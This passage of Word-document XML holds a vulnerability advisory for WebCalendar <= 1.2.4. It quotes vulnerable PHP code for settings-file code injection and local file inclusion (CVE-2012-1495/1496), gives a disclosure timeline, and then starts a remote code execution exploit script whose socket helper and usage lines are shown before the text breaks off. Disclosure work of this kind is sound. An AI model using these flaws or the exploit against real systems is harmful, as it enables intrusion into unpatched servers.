          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>America/New_York");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B07B91"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 xml:space="preserve">    740.        fwrite </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( $</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>fd, "&lt;?php\r\n" );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34813F9F"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 xml:space="preserve">    741.        fwrite </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( $</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">fd, '/* updated via install/index.php on ' . date </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( '</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>r' ) . "\r\n</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>" )</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D727759"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 xml:space="preserve">    742.        foreach </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( $</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>settings as $k =&gt; $v ) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B598134"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 xml:space="preserve">    743.          if </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( $</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>v != '&lt;br /&gt;' &amp;&amp; $v != '' )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03BE62A3"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 xml:space="preserve">    744.          fwrite </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( $</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>fd, $k . ': ' . $</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>v .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> "\r\n</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>" )</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39DACA47"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 xml:space="preserve">    745.      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  }</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="198ECF13"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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16AAD81B"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 xml:space="preserve">    Restricted </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>access  to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> this script isn't  properly realized,  so an attacker might be able</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3331533C"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>to  update</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  /includes/settings.php  with arbitrary  values  or  inject PHP code  into it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0652ECF5"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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36592369"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 xml:space="preserve">    [-] vulnerable code to LFI in /pref.php (CVE-2012-1496)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B033A9"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 xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46BA9CEE"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 xml:space="preserve">    70.    if </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( !</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> empty ( $_POST ) &amp;&amp; empty ( $error )) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00233BB1"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 xml:space="preserve">    71.      $my_theme = '';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B5B7FC"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 xml:space="preserve">    72.      $currenttab = getPostValue </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( '</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>currenttab' );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="706031B6"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 xml:space="preserve">    73.      save_pref </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( $</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>_POST, 'post' );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35600250"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 xml:space="preserve">    74.    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F457FD1"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 xml:space="preserve">    75.      if </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( !</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> empty ( $my_theme ) ) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68455D13"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 xml:space="preserve">    76.        $theme = 'themes/'. $my_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>theme .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> '_pref.php';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48108E2C"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 xml:space="preserve">    77.        include_once $theme;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2B19E2"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 xml:space="preserve">    78.        save_pref </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( $</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>webcal_theme, 'theme' );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="168CBC29"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 xml:space="preserve">    79.    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  }</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="301B2831"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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE1BB97"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 xml:space="preserve">    Input passed through $_POST['pref_THEME'] isn't properly </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sanitized  before</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> being assigned</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE656E4"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 xml:space="preserve">    to $my_theme variable, this can be exploited to include arbitrary local files at line 77.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A023CD"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Exploitation  of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> this  vulnerability requires  authentication and magic_quotes_gpc = off.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="478A2113"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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1923B92F"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 xml:space="preserve">    [-] Disclosure timeline:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A840D67"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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0702ED48"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 xml:space="preserve">    [02/10/2011] - Vulnerabilities discovered</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165593DD"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 xml:space="preserve">    [04/10/2011] - Vendor notified to http://sourceforge.net/support/tracker.php?aid=3418570</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C163B4E"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 xml:space="preserve">    [20/02/2012] - First vendor response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BEE1E1E"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 xml:space="preserve">    [28/02/2012] - Vendor fix committed to CVS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69062542"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 xml:space="preserve">    [29/02/2012] - Version 1.2.5 released</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD0564E"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 xml:space="preserve">    [02/03/2012] - CVE numbers requested</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728BB571"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 xml:space="preserve">    [02/03/2012] - Assigned CVE-2012-1495 and CVE-2012-1496</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74BC9859"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 xml:space="preserve">    [23/04/2012] - Public disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022D888B"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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27DBF9DD"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0D6410" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45C47CF3"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lastRenderedPageBreak/>
        <w:t>error_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>reporting(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFA4687"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set_time_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>limit(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25707120"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ini_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>set(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>"default_socket_timeout", 5);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B0A86C" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="453A223B"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function http_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>send(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$host, $packet)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="624019F5"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5030B4C1"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 xml:space="preserve">    if </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>(!(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$sock = fsockopen($host, 80))) die( "\n[-] No response from {$host}:80\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77932767"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>fwrite(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$sock, $packet);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635B8BB5"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 xml:space="preserve">    return stream_get_contents($sock);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0B912B"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38CD0679" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C7E205B"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print "\n+-------------------------------------------------------------+";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DAC1913"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print "\n| WebCalendar &lt;= 1.2.4 Remote Code Executionn Exploit by EgiX |";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E4ADBD2"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print "\n+-------------------------------------------------------------+\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DFF31D" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="327E61A0"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if ($argc &lt; 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3573F28B"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2C99E9"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 xml:space="preserve">    print "\nUsage......: php $</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>argv[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0] &lt;host&gt; &lt;path&gt;\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16194A33"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 xml:space="preserve">    print "\nExample....: php $</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>argv[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0] localhost /";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63405619"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 xml:space="preserve">    print "\nExample....: php $</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>argv[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0] localhost /webcalendar/\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3633F98A"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>die(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F8F1A9"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235BA1A9" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D558BE5" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>list(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
